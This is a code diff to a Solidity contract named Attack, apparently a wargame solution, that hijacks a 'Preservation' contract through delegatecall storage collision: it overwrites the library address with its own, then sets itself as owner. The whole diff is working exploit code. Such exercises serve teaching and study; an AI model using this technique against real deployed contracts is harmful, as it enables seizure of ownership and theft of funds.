@@ -17,16 +17,18 @@ contract Attack {
     }
 
     // Step 1: Set the timeZoneLubrary address to be this address
-    function setLibraryToAttackAddress() external {
+    function setLibraryToAttackAddress() public {
         preservationContract.setFirstTime(uint256(uint160((address(this)))));
+        // preservationContract.setSecondTime(uint256(uint160((address(this)))));
     }
 
     // Step2: Set the owner of the Preservation contract
-    function SetOwnerOfPreservationContract() external {
+    function SetOwnerOfPreservationContract() public {
         preservationContract.setFirstTime((uint256(uint160(msg.sender))));
+        // preservationContract.setSecondTime((uint256(uint160(msg.sender))));
     }
 
-    function setTime(uint _owner) external {
+    function setTime(uint _owner) public {
         owner = address(uint160(_owner));
     }
 }
